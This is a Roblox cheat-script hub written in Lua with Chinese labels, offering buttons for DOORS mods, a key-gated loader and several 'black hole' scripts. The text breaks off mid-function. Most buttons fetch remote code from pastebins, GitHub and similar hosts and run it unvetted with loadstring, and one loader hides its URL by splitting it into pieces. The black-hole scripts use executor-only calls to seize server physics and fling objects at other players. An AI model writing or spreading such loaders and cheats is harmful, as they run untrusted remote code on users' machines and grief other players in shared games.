Tab:AddButton({
  Name = "魔鬼辣火腿肠",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/sharksharksharkshark/musical-pancake/main/huo.txt"))();
  end
})

Tab:AddButton({
  Name = "幸运方块",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Lucky%20Block"))()
  end
})

Tab:AddButton({
  Name = "雪球",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/PenguinManiack/every-gun/main/christmas%20balls"))()
  end
})

local Section = Tab:AddSection({
	Name = "召唤"
})

Tab:AddButton({
  Name = "召唤肘击王",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/DripCapybara/Doors-Mode-Remakes/refs/heads/main/PandemoniumProtected.lua"))()
  end
})

Tab:AddButton({
  Name = "生成giggle",
  Callback = function()
  getgenv().GIGGLE_SPAWN_CONFIG = {
     Damage = 6,
     AttackingTime = math.random(7, 10), -- The time giggle will be attacking for.
     FallSpeed = 3,        -- Speed for when giggle spawns, can be mininum 2 and how high you want
     
     Stunnable = true,    -- If set to true, Giggle will be stunnable with glowstick
     StunTime = 5, -- The time giggle will be stun for
     
     RagdollThrowForce = 50,    -- The Ragdoll's Force when its thrown
     RagdollDissapears = true,  -- If set to true the ragdoll will dissapear once giggle finishes attacking.
  
     RoomSpawning = {
          Enabled = true   -- If set to false, giggle will spawn around the player.
     },
     
     PlayerSpawning = { -- This table will be used if Room Spawning is Disabled
          MinRadius = -20,  -- The minimum distance giggle can spawn from the player.
          MaxRadius = 20.  --  The maximum distance giggle can spawn from the player.
     },
     
     SpawningKey = { -- Key for Spawning
          Enabled = false,  -- If enabled once the key is pressed, giggle will spawn.
          Key = "G"    -- Key that is used for spawning giggle
     }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/DripCapybara/Test/refs/heads/main/Doors/GiggleSpawn.lua"))()
  end
})

Tab:AddButton({
  Name = "生成巨魔脸",
  Callback = function()
  loadstring(game:HttpGet("https://api.hugebonus.xyz/scripts/TrollFaceSpawner.lua"))()
  end
})

Tab:AddButton({
  Name = "生成Rush（可被杀）",
  Callback = function()
  local Creator = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()

        -- Create entity
        local entity = Creator.createEntity({
            CustomName = "Rush", -- Custom name of your entity
            Model = "https://github.com/Johnny39871/assets/blob/main/Rush.rbxm?raw=true", -- Can be GitHub file or rbxassetid
            Speed = 100, -- Percentage, 100 = default Rush speed
            DelayTime = 2, -- Time before starting cycles (seconds)
            HeightOffset = 0,
            CanKill = true,
            KillRange = 25,
            BreakLights = true,
            BackwardsMovement = false,
            FlickerLights = {
                true, -- Enabled/Disabled
                1, -- Time (seconds)
            },
            Cycles = {
                Min = 1,
                Max = 1,
                WaitTime = 2,
            },
            CamShake = {
                true, -- Enabled/Disabled
                {3.5, 20, 0.1, 1}, -- Shake values (don't change if you don't know)
                100, -- Shake start distance (from Entity to you)
            },
            Jumpscare = {
                true, -- Enabled/Disabled
                {
                    Image1 = "rbxassetid://10483855823", -- Image1 url
                    Image2 = "rbxassetid://10483999903", -- Image2 url
                    Shake = true,
                    Sound1 = {
                        10483790459, -- SoundId
                        { Volume = 0.5 }, -- Sound properties
                    },
                    Sound2 = {
                        10483837590, -- SoundId
                        { Volume = 0.5 }, -- Sound properties
                    },
                    Flashing = {
                        true, -- Enabled/Disabled
                        Color3.fromRGB(0, 0, 255), -- Color
                    },
                    Tease = {
                        true, -- Enabled/Disabled
                        Min = 4,
                        Max = 4,
                    },
                },
            },
            CustomDialog = {"你死于rush", "怎么会...", "_#￥#_￥#_#_#_#__##_5%8#5%8%4%4%4%7%8%6#87%28#8#5%8￥5#5%58￥￥5#8%88￥%57%5#8%5%5%8%5%85￥5￥6￥6￥6%8..."}, -- Custom death message
        })
        
        -----[[ Advanced ]]-----
        entity.Debug.OnEntitySpawned = function(entityTable)
            print("Entity has spawned:", entityTable.Model)
        end
        
        entity.Debug.OnEntityDespawned = function(entityTable)
            print("Entity has despawned:", entityTable.Model)
        end
        
        entity.Debug.OnEntityStartMoving = function(entityTable)
            print("Entity has started moving:", entityTable.Model)
        end
        
        entity.Debug.OnEntityFinishedRebound = function(entityTable)
            print("Entity has finished rebound:", entityTable.Model)
        end
        
        entity.Debug.OnEntityEnteredRoom = function(entityTable, room)
            print("Entity:", entityTable.Model, "has entered room:", room)
        end
        
        entity.Debug.OnLookAtEntity = function(entityTable)
            print("Player has looked at entity:", entityTable.Model)
        end
        
        entity.Debug.OnDeath = function(entityTable)
            warn("Player has died.")
        end
        ------------------------
        
        -- Run the created entity
        Creator.runEntity(entity)
  end
})

Tab:AddButton({
  Name = "刷新Eyes(无伤害)",
  Callback = function()
  local enableDamage = false
repenttimes = 0
local deadeyescrucifix = false
local repentcomplete = false
local currentLoadedRoom = workspace.CurrentRooms[game:GetService("ReplicatedStorage").GameData.LatestRoom.Value]
local eyes = game:GetObjects("rbxassetid://11488518082")[1]
local num = math.floor(#currentLoadedRoom.Nodes:GetChildren() / 2)
eyes.CFrame = (num == 0 and currentLoadedRoom.Base or currentLoadedRoom.Nodes[num]).CFrame + Vector3.new(0, 7, 0)

eyes.Parent = workspace
eyes.Initiate:Play()
task.wait(0.5)
eyes.Attachment.Eyes.Enabled = true
eyes.whisper:Play()
eyes.whisper.Looped = true
function EyesHell()
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
camara.CFrame = camara.CFrame * shakeCf
end)
camShake:Start()
camShake:ShakeOnce(10,30,0.7,0.1)
ts = game:GetService("TweenService")
wait(0.2)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
camara.CFrame = camara.CFrame * shakeCf
end)
camShake:Start()
camShake:ShakeOnce(2,30,5,2)
wait(3)

eyes.Scream:Play()
ts:Create(eyes,TweenInfo.new(5),{CFrame = eyes.CFrame - Vector3.new(0,12,0)}):Play()
wait(7)
eyes:Destroy()
end
local hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")

local function IsVisible(part)
	local vec, found=workspace.CurrentCamera:WorldToViewportPoint(part.Position)
	local onscreen = found and vec.Z > 0
	local cfg = RaycastParams.new();
	cfg.FilterType = Enum.RaycastFilterType.Blacklist
	cfg.FilterDescendantsInstances = {part};

	local cast = workspace:Raycast(part.Position, (game.Players.LocalPlayer.Character.UpperTorso.Position - part.Position), cfg);
	return (onscreen and true) and ((cast and cast.Instance).Parent==game.Players.LocalPlayer.Character and true)
end

while true do
	if workspace.CurrentRooms[game:GetService("ReplicatedStorage").GameData.LatestRoom.Value] ~= currentLoadedRoom then
		enableDamage = false
		task.wait(0.2)
		eyes:Destroy()
	end
	if enableDamage then
		if (IsVisible(eyes)) and not game.Players.LocalPlayer.Character:FindFirstChild("Crucifix") and deadeyescrucifix == false then
		game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health - 10
		wait(0.2)
		elseif (IsVisible(eyes)) and game.Players.LocalPlayer.Character:FindFirstChild("Crucifix") and repenttimes < 5 and deadeyescrucifix == false then
        print("GET THAT AWAY FROM ME")
        eyes.Repent:Play()
        eyes.Attachment.Angry.Enabled = true
        local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
camara.CFrame = camara.CFrame * shakeCf
end)
camShake:Start()

camShake:ShakeOnce(5,50,0.7,0.2)
        wait(0.7)
        repenttimes = repenttimes + 1
        print(repenttimes)
        eyes.Attachment.Angry.Enabled = false
        wait(0.4)
		elseif game.Players.LocalPlayer.Character:FindFirstChild("Crucifix") and repenttimes == 5 and deadeyescrucifix == false then
		local hi = game.Players.LocalPlayer.Character:FindFirstChild("Crucifix").Handle:Clone()
        hi.Anchored = true
        hi.Parent = workspace
        hi:PivotTo(game.Players.LocalPlayer.Character:FindFirstChild("Crucifix").Handle.CFrame)
        game.Players.LocalPlayer.Character:FindFirstChild("Crucifix"):Destroy()
        EyesHell()
        enableDamage = false
			if hum.Health <= 0 then
				game:GetService("ReplicatedStorage").GameStats["Player_" .. game.Players.LocalPlayer.Name].Total.DeathCause.Value =
					"Eyes"
				debug.setupvalue(
					getconnections(game:GetService("ReplicatedStorage").Bricks.DeathHint.OnClientEvent)[1].Function,
					1,
					{
						"You died to the Eyes...",
						"They don't like to be stared at.",
					}
				)
			end
		end
	end
	task.wait(0.2)
end
  end
})

Tab:AddButton({
  Name = "刷新Eyes",
  Callback = function()
  local enableDamage = true
repenttimes = 0
local deadeyescrucifix = false
local repentcomplete = false
local currentLoadedRoom = workspace.CurrentRooms[game:GetService("ReplicatedStorage").GameData.LatestRoom.Value]
local eyes = game:GetObjects("rbxassetid://11488518082")[1]
local num = math.floor(#currentLoadedRoom.Nodes:GetChildren() / 2)
eyes.CFrame = (num == 0 and currentLoadedRoom.Base or currentLoadedRoom.Nodes[num]).CFrame + Vector3.new(0, 7, 0)

eyes.Parent = workspace
eyes.Initiate:Play()
task.wait(0.5)
eyes.Attachment.Eyes.Enabled = true
eyes.whisper:Play()
eyes.whisper.Looped = true
function EyesHell()
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
camara.CFrame = camara.CFrame * shakeCf
end)
camShake:Start()
camShake:ShakeOnce(10,30,0.7,0.1)
ts = game:GetService("TweenService")
wait(0.2)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
camara.CFrame = camara.CFrame * shakeCf
end)
camShake:Start()
camShake:ShakeOnce(2,30,5,2)
wait(3)

eyes.Scream:Play()
ts:Create(eyes,TweenInfo.new(5),{CFrame = eyes.CFrame - Vector3.new(0,12,0)}):Play()
wait(7)
eyes:Destroy()
end
local hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")

local function IsVisible(part)
	local vec, found=workspace.CurrentCamera:WorldToViewportPoint(part.Position)
	local onscreen = found and vec.Z > 0
	local cfg = RaycastParams.new();
	cfg.FilterType = Enum.RaycastFilterType.Blacklist
	cfg.FilterDescendantsInstances = {part};

	local cast = workspace:Raycast(part.Position, (game.Players.LocalPlayer.Character.UpperTorso.Position - part.Position), cfg);
	return (onscreen and true) and ((cast and cast.Instance).Parent==game.Players.LocalPlayer.Character and true)
end

while true do
	if workspace.CurrentRooms[game:GetService("ReplicatedStorage").GameData.LatestRoom.Value] ~= currentLoadedRoom then
		enableDamage = false
		task.wait(0.2)
		eyes:Destroy()
	end
	if enableDamage then
		if (IsVisible(eyes)) and not game.Players.LocalPlayer.Character:FindFirstChild("Crucifix") and deadeyescrucifix == false then
		game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health - 10
		wait(0.2)
		elseif (IsVisible(eyes)) and game.Players.LocalPlayer.Character:FindFirstChild("Crucifix") and repenttimes < 5 and deadeyescrucifix == false then
        print("GET THAT AWAY FROM ME")
        eyes.Repent:Play()
        eyes.Attachment.Angry.Enabled = true
        local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
camara.CFrame = camara.CFrame * shakeCf
end)
camShake:Start()

camShake:ShakeOnce(5,50,0.7,0.2)
        wait(0.7)
        repenttimes = repenttimes + 1
        print(repenttimes)
        eyes.Attachment.Angry.Enabled = false
        wait(0.4)
		elseif game.Players.LocalPlayer.Character:FindFirstChild("Crucifix") and repenttimes == 5 and deadeyescrucifix == false then
		local hi = game.Players.LocalPlayer.Character:FindFirstChild("Crucifix").Handle:Clone()
        hi.Anchored = true
        hi.Parent = workspace
        hi:PivotTo(game.Players.LocalPlayer.Character:FindFirstChild("Crucifix").Handle.CFrame)
        game.Players.LocalPlayer.Character:FindFirstChild("Crucifix"):Destroy()
        EyesHell()
        enableDamage = false
			if hum.Health <= 0 then
				game:GetService("ReplicatedStorage").GameStats["Player_" .. game.Players.LocalPlayer.Name].Total.DeathCause.Value =
					"Eyes"
				debug.setupvalue(
					getconnections(game:GetService("ReplicatedStorage").Bricks.DeathHint.OnClientEvent)[1].Function,
					1,
					{
						"You died to the Eyes...",
						"They don't like to be stared at.",
					}
				)
			end
		end
	end
	task.wait(0.2)
end
  end
})

local Tab = Window:MakeTab({
    Name = " Doors模式",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "Doors修改各种模式",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/Pm3rvBNw"))()
  end
})

Tab:AddButton({
  Name = "不可能",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Ukazix/impossible-mode/main/Protected_79.lua.txt'))()
  end
})

Tab:AddButton({
  Name = "极端",
  Callback = function()
  loadstring(game:HttpGet('https://github.com/HollowedOutMods/MayhemMode/blob/main/loader.lua?raw=true'))()
  end
})

Tab:AddButton({
  Name = "Endless模式",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/check78/worldcuuuup/main/Script.lua"))()
  end
})

Tab:AddButton({
  Name = "脚本模式",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/munciseek/DOORS-mode/main/ScripV2"))()
  end
})

Tab:AddButton({
  Name = "困难",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/plamen6789/HardcoreScriptDOORS/main/HardcoreModeScript'))()
  end
})

Tab:AddButton({
  Name = "生日",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/plamen6789/BirthdayModeDOORS/main/BirthdayModeScript'))()
  end
})

Tab:AddButton({
  Name = "硬核V6",
  Callback = function()
  loadstring(game:HttpGet("https://raw.Motherfucker.com/Idiot114514/false/main/Bad-Hardcore_Mode.lua"))()
  end
})

Tab:AddButton({
  Name = "慌乱",
  Callback = function()
  loadstring(game:HttpGet('https://github.com/HollowedOutMods/MayhemMode/blob/main/loader.lua?raw=true'))()
  end
})

Tab:AddButton({
  Name = "恐惧模式",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/cool59572/freestuff/main/Mods/FearMode.lua"))()
  end
})

Tab:AddButton({
  Name = "破片模式v4",
  Callback = function()
  loadstring(game:HttpGet("https://glot.io/snippets/gpw1ypnl5o/raw/main.lua"))()
  end
})

Tab:AddButton({
  Name = "新怪物模式(可能)",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
  end
})

local Tab = Window:MakeTab({
    Name = "MS V4专区",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "MS V4",
  Callback = function()
  loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()
  end
})

Tab:AddParagraph("更快的方法
script_key="输入你的卡密";
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()")

Tab:AddButton({
	Name = "复制更快的方法",
	Callback = function()
setclipboard("script_key="输入你得到的卡密";
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()")
end
})

Tab:AddButton({
	Name = "复制卡密网站",
	Callback = function()
setclipboard("mspaint.cc/key")
end
})

local Section = Tab:AddSection({
	Name = "支持的服务器"
})

Tab:AddLabel("DOORS")
Tab:AddLabel("Fisch")
Tab:AddLabel("Rooms&Doors")
Tab:AddLabel("压力")
Tab:AddLabel("3008")
Tab:AddLabel("造船寻宝")
Tab:AddLabel("格蕾丝")
Tab:AddLabel("Murder Mystery 2")
Tab:AddLabel("Shrimp Game")
Tab:AddLabel("Word Bomb")
Tab:AddLabel("Notoriety")

local Tab = Window:MakeTab({
	Name = "黑洞脚本合集(有的可能不能用)",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "辅助脚本(可以让黑洞吸力更强)",
  Callback = function()
if "you wanna use rochips universal" then
	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
	local im,lonely,z_c=task.wait,game,loadstring
	z_c(lonely:HttpGet(z_z..""..z_x))()
	return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
end
  end
})

Tab:AddButton({
  Name = "辅助脚本第2种(可以切换黑洞模式)",
  Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/AxolotlBmgo/8888080921c2b426a32dd9ff587baff1/raw/d45e03afed3c1716f36523bbf6dd741d3d2aad00/gistfile1.txt"))()
  end
})

Tab:AddButton({
  Name = "黑洞之神(别人应该看不见)",
  Callback = function()
  local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local MaxRange = 100  -- Set your maximum range

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")

if not HumanoidRootPart then
    print("Cannot find the HumanoidRootPart of your character. Please ensure your character has been fully loaded.")
    return
end

local Attachment1 = Instance.new("Attachment", HumanoidRootPart)

local function TeleportPart(v)
    if v:IsA("Part") and v.Parent ~= Character and not v:IsDescendantOf(Character) then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end

        v.CanCollide = false 

        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)

        AlignPosition.MaxForce = math.huge 
        AlignPosition.MaxVelocity = math.huge 
        AlignPosition.Responsiveness = math.huge  -- Always within suction range
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function TeleportAllParts()
    for _, v in next, game:GetService("Workspace"):GetDescendants() do
        TeleportPart(v)
    end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(TeleportPart)

UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.E and not Chat then
        Attachment1.WorldCFrame = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)

spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Mouse.Hit + Vector3.new(0, 5, 0)
        -- Force to stay within the suction range
        for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("Part") and v.Parent ~= Character and not v:IsDescendantOf(Character) then
                local dist = (v.Position - HumanoidRootPart.Position).Magnitude
                if dist > MaxRange then
                    v.Position = HumanoidRootPart.Position + (v.Position - HumanoidRootPart.Position).Unit * MaxRange
                end
            end
        end
    end
end)
  end
})

Tab:AddButton({
  Name = "最垃圾黑洞(配合指令“tpua”使用)",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
  end
})

Tab:AddButton({
  Name = "普通黑洞(E键控制)",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/Sx6PY4gV"))()
  end
})

Tab:AddButton({
  Name = "普通黑洞(第2种)(点击即跟随)",
  Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/BbXuvVkK/raw'),true))()
  end
})

Tab:AddButton({
  Name = "高级黑洞(吸力超强E键控制)",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/Kgtw4gt7"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第1种)",
  Callback = function()
    print('Hello World!');local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

local Attachment1 = Instance.new("Attachment", Part)

local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local ForceStrength = math.huge

local function TeleportPart(v)
   if v:IsA("Part") and v.Anchored == false and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       Mouse.TargetFilter = v
       for _, x in next, v:GetChildren() do
           if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
               x:Destroy()
           end
       end
       if v:FindFirstChild("Attachment") then
           v:FindFirstChild("Attachment"):Destroy()
       end

       v.CanCollide = false

       local Torque = Instance.new("BodyAngularVelocity", v)
       Torque.AngularVelocity = Vector3.new(0, math.rad(ForceStrength * 4), 0) -- 更快的旋转速度

       local AlignPosition = Instance.new("AlignPosition", v)
       local Attachment2 = Instance.new("Attachment", v)

       AlignPosition.MaxForce = math.huge
       AlignPosition.MaxVelocity = math.huge
       AlignPosition.Responsiveness = math.huge  -- 始终在吸取范围内
       AlignPosition.Attachment0 = Attachment2
       AlignPosition.Attachment1 = Attachment1
   end
end

local function TeleportAllParts()
   for _, v in next, game:GetService("Workspace"):GetDescendants() do
       if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
           TeleportPart(v)
       end
   end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(function(v)
   if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       TeleportPart(v)
   end
end)

UserInputService.InputBegan:Connect(function(Key, Chat)
   if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
   end
end)

spawn(function()
   while game:GetService("RunService").RenderStepped:Wait() do
       Attachment1.WorldCFrame = Updated
   end
end)

--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(Part)
        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, Part in pairs(Network.BaseParts) do
                if Part:IsDescendantOf(Workspace) then
                    Part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" and v.Parent ~= LocalPlayer.Character then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local blackHoleActive = true

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                Attachment1.WorldCFrame = humanoidRootPart.CFrame
            end
        end)
    end
end

local function createControlButton()
    local screenGui = Instance.new("ScreenGui")
    local button = Instance.new("TextButton")

    screenGui.Name = "BlackHoleControlGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    button.Name = "ToggleBlackHoleButton"
    button.Size = UDim2.new(0, 200, 0, 50)
    button.Position = UDim2.new(0.5, -100, 0, 100)
    button.Text = "Desativar Buraco Negro"
    button.Parent = screenGui

    button.MouseButton1Click:Connect(function()
        toggleBlackHole()
        if blackHoleActive then
            button.Text = "Desativar Buraco Negro"
        else
            button.Text = "Ativar Buraco Negro"
        end
    end)
end

createControlButton()
toggleBlackHole()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第2种要输入玩家名字)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/lililiugg/main/jm114514.lua"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第3种)",
  Callback = function()
  local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
 
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
 
if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }
 
    Network.RetainPart = function(Part)
        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end
 
    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, Part in pairs(Network.BaseParts) do
                if Part:IsDescendantOf(Workspace) then
                    Part.Velocity = Network.Velocity
                end
            end
        end)
    end
 
    EnablePartControl()
end
 
local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end
 
local blackHoleActive = true
 
local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end
 
        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)
 
        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                Attachment1.WorldCFrame = humanoidRootPart.CFrame
            end
        end)
    end
end
 
local function createControlButton()
    local screenGui = Instance.new("ScreenGui")
    local button = Instance.new("TextButton")
 
    screenGui.Name = "BlackHoleControlGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
    button.Name = "ToggleBlackHoleButton"
    button.Size = UDim2.new(0, 200, 0, 50)
    button.Position = UDim2.new(0.5, -100, 0, 100)
    button.Text = "Desativar Buraco Negro"
    button.Parent = screenGui
 
